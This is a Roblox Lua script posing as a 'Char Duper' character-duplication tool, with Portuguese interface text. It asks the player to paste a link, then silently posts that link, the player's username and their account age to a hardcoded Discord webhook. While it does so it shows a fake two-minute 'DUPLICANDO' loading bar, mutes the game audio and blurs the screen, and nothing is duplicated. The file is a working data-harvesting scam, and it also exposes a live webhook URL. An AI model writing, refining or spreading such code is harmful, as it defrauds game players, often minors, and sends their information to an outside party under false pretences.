local UserInputService = game:GetService("UserInputService")
local SoundService = game:GetService("SoundService")
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1419071964320108704/MnIPt7KfZGFiiCua1D4H9st_OTAFWXclB5FfJN1eP50W9PCx-vzMMvzCN-KUT6uVu7uG"
local LOADING_TIME = 120

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "CharDuperGui"
ScreenGui.IgnoreGuiInset = true
ScreenGui.Enabled = false

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(1, 0, 1, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.BackgroundTransparency = 1
MainFrame.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Name = "Title"
Title.Size = UDim2.new(1, 0, 0.1, 0)
Title.Position = UDim2.new(0, 0, 0.2, 0)
Title.BackgroundTransparency = 1
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 48
Title.Font = Enum.Font.SourceSansBold
Title.Text = "Char Duper"
Title.Parent = MainFrame

local TextBox = Instance.new("TextBox")
TextBox.Name = "LinkBox"
TextBox.Size = UDim2.new(0.6, 0, 0.05, 0)
TextBox.Position = UDim2.new(0.2, 0, 0.4, 0)
TextBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.PlaceholderText = "cole o link aqui"
TextBox.PlaceholderColor3 = Color3.fromRGB(128, 128, 128)
TextBox.TextSize = 20
TextBox.Font = Enum.Font.SourceSans
TextBox.ClearTextOnFocus = false
TextBox.Parent = MainFrame

local DupeButton = Instance.new("TextButton")
DupeButton.Name = "DupeButton"
DupeButton.Size = UDim2.new(0.3, 0, 0.05, 0)
DupeButton.Position = UDim2.new(0.35, 0, 0.5, 0)
DupeButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
DupeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
DupeButton.Text = "DUPLICAR"
DupeButton.TextSize = 24
DupeButton.Font = Enum.Font.SourceSansBold
DupeButton.Visible = false
DupeButton.Parent = MainFrame

local LoadingText = Instance.new("TextLabel")
LoadingText.Name = "LoadingText"
LoadingText.Size = UDim2.new(1, 0, 0.1, 0)
LoadingText.Position = UDim2.new(0, 0, 0.3, 0)
LoadingText.BackgroundTransparency = 1
LoadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
LoadingText.TextSize = 36
LoadingText.Font = Enum.Font.SourceSansBold
LoadingText.Text = "DUPLICANDO"
LoadingText.Visible = false
LoadingText.Parent = MainFrame

local LoadingBarBg = Instance.new("Frame")
LoadingBarBg.Name = "LoadingBarBg"
LoadingBarBg.Size = UDim2.new(0.6, 0, 0.03, 0)
LoadingBarBg.Position = UDim2.new(0.2, 0, 0.45, 0)
LoadingBarBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
LoadingBarBg.Visible = false
LoadingBarBg.Parent = MainFrame

local LoadingBarFill = Instance.new("Frame")
LoadingBarFill.Name = "LoadingBarFill"
LoadingBarFill.Size = UDim2.new(0, 0, 1, 0)
LoadingBarFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
LoadingBarFill.Parent = LoadingBarBg

local function PlayClickSound()
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxasset://sounds/click.mp3"
    sound.Volume = 1
    sound.Parent = game.Workspace
    sound:Play()
    game:GetService("Debris"):AddItem(sound, 1)
end

local function SendWebhook(link)
    local player = Players.LocalPlayer
    local data = {
        content = string.format("New attempt:\nUsername: %s\nLink: %s\nAccount Age: %d days",
            player.Name,
            link,
            player.AccountAge)
    }
    
    local success, response = pcall(function()
        return HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(data))
    end)
end

local function StartLoading()
    LoadingText.Visible = true
    LoadingBarBg.Visible = true
    TextBox.Visible = false
    DupeButton.Visible = false
    
    local tween = TweenService:Create(LoadingBarFill,
        TweenInfo.new(LOADING_TIME, Enum.EasingStyle.Linear),
        {Size = UDim2.new(1, 0, 1, 0)}
    )
    tween:Play()
end

-- Show/Hide GUI function
local function ToggleGui()
    if not ScreenGui.Enabled then
        PlayClickSound()
        SoundService.MasterVolume = 0
        
        -- Blur effect
        local blur = Instance.new("BlurEffect")
        blur.Size = 20
        blur.Parent = game.Lighting
        
        -- Animate GUI appearance
        ScreenGui.Enabled = true
        local tween = TweenService:Create(MainFrame,
            TweenInfo.new(0.5, Enum.EasingStyle.Quad),
            {BackgroundTransparency = 0}
        )
        tween:Play()
    end
end

DupeButton.MouseButton1Click:Connect(function()
    if TextBox.Text ~= "" then
        SendWebhook(TextBox.Text)
        StartLoading()
    end
end)

TextBox:GetPropertyChangedSignal("Text"):Connect(function()
    DupeButton.Visible = TextBox.Text ~= ""
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.Plus then
        ToggleGui()
    end
end)

-- Parent ScreenGui to the appropriate location
if game:GetService("RunService"):IsStudio() then
    ScreenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
else
    ScreenGui.Parent = game.CoreGui
end
```